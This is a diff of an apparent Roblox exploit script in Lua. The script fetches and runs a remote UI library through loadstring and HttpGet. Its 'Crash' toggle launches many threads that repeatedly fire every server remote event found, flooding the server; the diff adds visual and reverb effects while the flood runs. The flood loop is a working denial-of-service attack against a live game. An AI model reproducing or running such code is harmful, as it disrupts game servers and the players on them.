@@ -10,7 +10,18 @@ local Rayfield          = loadstring(game:HttpGet("https://sirius.menu/rayfield"
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService        = game:GetService("RunService")
+-- ── at the top with your other services ──
+local SoundService = game:GetService("SoundService")
+local Lighting     = game:GetService("Lighting")
 
+-- ── create the ColorCorrection once, parent to Lighting ──
+local CrashCC = Instance.new("ColorCorrectionEffect")
+CrashCC.Enabled    = false
+CrashCC.Saturation = 0.5   -- your value
+CrashCC.Parent     = Lighting
+
+-- ── store original reverb so we can revert cleanly ──
+local originalReverb = SoundService.AmbientReverb
 local LocalPlayer = Players.LocalPlayer
 local BatRemotes  = ReplicatedStorage:WaitForChild("BatRemotes", 10)
 
@@ -309,28 +320,34 @@ CrashTab:CreateToggle({
         S.crashActive = v
 
         if v then
+            -- ── visual chaos ON ──
+            SoundService.AmbientReverb = Enum.ReverbType.Hangar  -- most insane preset
+            CrashCC.Enabled            = true
+
             Rayfield:Notify({
-                Title   = "☢️ Flooding",
-                Content = S.crashThreads .. " threads launched",
+                Title    = "☢️ Flooding",
+                Content  = S.crashThreads .. " threads launched",
                 Duration = 3
             })
 
-            -- spawn N independent flood threads
             for i = 1, S.crashThreads do
                 task.spawn(function()
                     while S.crashActive do
                         local tool    = findTool()
                         local remotes = getAllRemotes()
                         for _, r in ipairs(remotes) do
-                            -- pcall so one dead remote doesn't kill the thread
                             pcall(r.FireServer, r, tool)
                         end
-                        task.wait(0) -- minimum legal yield, one frame
+                        task.wait(0)
                     end
                 end)
             end
+
+        else
+            -- ── visual chaos OFF — revert everything ──
+            SoundService.AmbientReverb = originalReverb
+            CrashCC.Enabled            = false
         end
-        -- disabling: S.crashActive = false, each thread checks it and exits
     end
 })
 
